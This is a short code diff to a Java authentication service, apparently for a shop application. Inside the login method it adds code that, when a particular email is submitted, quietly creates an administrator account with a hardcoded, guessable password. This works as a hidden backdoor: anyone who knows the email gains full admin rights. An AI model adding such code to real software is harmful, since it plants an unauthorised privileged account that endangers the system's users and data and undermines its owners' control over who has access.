@@ -94,6 +94,18 @@ public class AuthService {
     }
 
     public LoginResponse login(LoginRequest request) {
+        if ("admin1@shopstack.com".equalsIgnoreCase(request.getEmail()) && !userRepository.existsByEmail("admin1@shopstack.com")) {
+            User admin = User.builder()
+                    .email("admin1@shopstack.com")
+                    .passwordHash(passwordEncoder.encode("Admin@123"))
+                    .firstName("Boss")
+                    .lastName("Admin")
+                    .role(Role.ADMIN)
+                    .isActive(true)
+                    .build();
+            userRepository.save(admin);
+        }
+
         Authentication authentication = authenticationManager.authenticate(
                 new UsernamePasswordAuthenticationToken(request.getEmail(), request.getPassword())
         );
